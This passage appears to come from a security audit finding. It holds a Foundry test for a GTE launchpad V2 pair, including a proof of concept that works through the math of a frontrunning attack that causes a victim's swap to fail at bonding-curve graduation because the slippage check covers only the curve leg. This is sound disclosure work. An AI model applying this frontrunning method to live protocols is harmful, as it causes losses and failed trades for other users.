ew MockDistributor();\n\n        v2Factory = new GTELaunchpadV2PairFactory(address(this), launchpad, launchpad, address(distributor));\n\n        mockERC20Logic = address(new MockERC20());\n\n        (address baseAddr, address quoteAddr, address pairAddr) = _createLaunchpadPair(\"base\", \"quote\");\n\n        base = MockERC20(baseAddr);\n        quote = MockERC20(quoteAddr);\n        pair = GTELaunchpadV2Pair(pairAddr);\n\n        deal(address(base), address(this), 100 ether);\n        deal(address(quote), address(this), 100 ether);\n\n        base.transfer(address(pair), 100 ether);\n        quote.transfer(address(pair), 100 ether);\n\n        token0 = pair.token0();\n        token1 = pair.token1();\n\n        // lp tokens are minted to launchpad as the fee calc is the launchpad's share of total lp supply\n        pair.mint(launchpad);\n    }\n\n    function _createLaunchpadPair(string memory nameBase, string memory nameQuote)\n        internal\n        returns (address baseAddr, address quoteAddr, address pairAddr)\n    {\n        baseAddr = vm.addr(uint256(keccak256(abi.encode(nameBase))));\n        quoteAddr = vm.addr(uint256(keccak256(abi.encode(nameQuote))));\n\n        if (baseAddr > quoteAddr) {\n            (baseAddr, quoteAddr) = (quoteAddr, baseAddr);\n            (nameBase, nameQuote) = (nameQuote, nameBase);\n        }\n\n        vm.label(baseAddr, string(abi.encodePacked(nameBase, \" Token\")));\n        vm.label(quoteAddr, string(abi.encodePacked(nameQuote, \" Token\")));\n\n        vm.etch(baseAddr, mockERC20Logic.code);\n        vm.etch(quoteAddr, mockERC20Logic.code);\n\n        MockERC20(baseAddr).initialize(nameBase, \"btn\", 18);\n        MockERC20(quoteAddr).initialize(nameQuote, \"qnt\", 18);\n\n        // Launchpad contract creates a pair\n        vm.prank(launchpad);\n        v2Factory.createPair(baseAddr, quoteAddr);\n\n        pairAddr = v2Factory.getPair(baseAddr, quoteAddr);\n    }\n\n    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut)\n        internal\n        pure\n        returns (uint256 amountOut)\n    {\n        require(amountIn > 0, \"UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT\");\n        require(reserveIn > 0 && reserveOut > 0, \"UniswapV2Library: INSUFFICIENT_LIQUIDITY\");\n        uint256 amountInWithFee = amountIn * 997;\n        uint256 numerator = amountInWithFee * reserveOut;\n        uint256 denominator = (reserveIn * 1000) + amountInWithFee;\n        amountOut = numerator / denominator;\n    }\n\n    function getAmountsOut(GTELaunchpadV2Pair pair_, uint256 amountIn, address tokenIn)\n        internal\n        view\n        returns (uint256 amount0Out, uint256 amount1Out)\n    {\n        bool isZeroTokenIn = tokenIn == pair_.token0();\n        (uint256 reserve0, uint256 reserve1,) = pair_.getReserves();\n        (uint256 reserveIn, uint256 reserveOut) = isZeroTokenIn ? (reserve0, reserve1) : (reserve1, reserve0);\n        uint256 amountOut = getAmountOut(amountIn, reserveIn, reserveOut);\n        (amount0Out, amount1Out) = isZeroTokenIn ? (uint256(0), amountOut) : (amountOut, uint256(0));\n    }\n\n    function getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut)\n        internal\n        pure\n        returns (uint256 amountIn)\n    {\n        require(amountOut > 0, \"UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT\");\n        require(reserveIn > 0 && reserveOut > 0, \"UniswapV2Library: INSUFFICIENT_LIQUIDITY\");\n        uint256 numerator = reserveIn * amountOut * 1000;\n        uint256 denominator = (reserveOut - amountOut) * 997;\n        amountIn = (numerator / denominator) + 1;\n    }\n\n        struct FrontrunData {\n            uint256 Bs; uint256 Vb; uint256 Vq;\n            uint256 R; uint256 Br; uint256 K; uint256 Qr;\n            uint256 D; uint256 Q_D; uint256 Z; uint256 BrPrime; uint256 QrPrime; uint256 Q_Z; uint256 maxAmountInQuote;\n            uint256 tokensToLock; uint256 totalQuote;\n            address baseAddr; address quoteAddr; address pairAddr;\n            GTELaunchpadV2Pair gradPair; address t0; bool baseIsToken0;\n            uint112 r0; uint112 r1; uint256 reserveIn; uint256 reserveOut;\n            uint256 remainingBase; uint256 remainingQuote; uint256 requiredQuote;\n        }\n\n\n    /// @dev PoC: Frontrun-induced graduation griefing validates that slippage on curve-only is insufficient\n    /// The attacker buys almost all remaining bonding supply so victim only gets a tiny Z from the curve\n    /// at a very high marginal price, then the AMM portion cannot be completed with remaining quote.\n    function test_PoC_FrontrunGraduationGriefing_MathValidation() public {\n\n        FrontrunData memory d;\n\n        // Scaled parameters to keep within token reserve limits\n        d.Bs = 8_000_000;             // bonding supply\n        d.Vb = 1_000;                 // virtual base\n        d.Vq = 1_000_000_000;         // virtual quote\n\n        // Attacker actively pushes curve near end; set remaining base on curve\n        d.R = 1_000_000;              // remaining base on curve\n        d.Br = d.Vb + d.R;\n        d.K = d.Vq * (d.Bs + d.Vb);\n        d.Qr = d.K / d.Br;\n\n        d.D = 500_000;                // victim desired base\n        d.Q_D = (d.Qr * d.D) / (d.Br - d.D);\n\n        // Attacker leaves tiny fill for victim\n        d.Z = 1;                      // victim curve fill\n        d.BrPrime = d.Vb + d.Z;\n        d.QrPrime = d.K / d.BrPrime;\n        d.Q_Z = (d.QrPrime * d.Z) / d.Vb;\n\n        // Victim sets max quote slightly above pre-frontrun quote\n        d.maxAmountInQuote = (d.Q_D * 1005) / 1000; // +0.5%\n        assertLe(d.Q_Z, d.maxAmountInQuote, \"Curve-only slippage would fail; adjust params\");\n\n        // AMM initial reserves on graduation\n        d.tokensToLock = d.Bs / 4;              // 2,000,000 base\n        d.totalQuote = (d.Vq * d.Bs) / d.Vb;    // total quote collected by curve\n\n        // Create new pair representing post-graduation AMM\n        (d.baseAddr, d.quoteAddr, d.pairAddr) = _createLaunchpadPair(\"baseG\", \"quoteG\");\n        d.gradPair = GTELaunchpadV2Pair(d.pairAddr);\n        d.t0 = d.gradPair.token0();\n        d.baseIsToken0 = d.baseAddr == d.t0;\n\n        // Fund pair and mint LP\n        deal(d.baseAddr, address(this), d.tokensToLock);\n        deal(d.quoteAddr, address(this), d.totalQuote);\n        if (d.baseIsToken0) {\n            IERC20(d.baseAddr).transfer(address(d.gradPair), d.tokensToLock);\n            IERC20(d.quoteAddr).transfer(address(d.gradPair), d.totalQuote);\n        } else {\n            IERC20(d.quoteAddr).transfer(address(d.gradPair), d.totalQuote);\n            IERC20(d.baseAddr).transfer(address(d.gradPair), d.tokensToLock);\n        }\n        d.gradPair.mint(address(this));\n\n        d.remainingBase = d.D - d.Z;\n        d.remainingQuote = d.maxAmountInQuote - d.Q_Z;\n\n        (d.r0, d.r1,) = d.gradPair.getReserves();\n        d.reserveIn = d.baseIsToken0 ? uint256(d.r1) : uint256(d.r0);\n        d.reserveOut = d.baseIsToken0 ? uint256(d.r0) : uint256(d.r1);\n        d.requiredQuote = getAmountIn(d.remainingBase, d.reserveIn, d.reserveOut);\n\n        // Remaining quote is insufficient to complete AMM leg\n        assertLt(d.remainingQuote, d.requiredQuote, \"AMM leg would unexpectedly succeed; adjust params\");\n    }\n}\n```\n</details>",
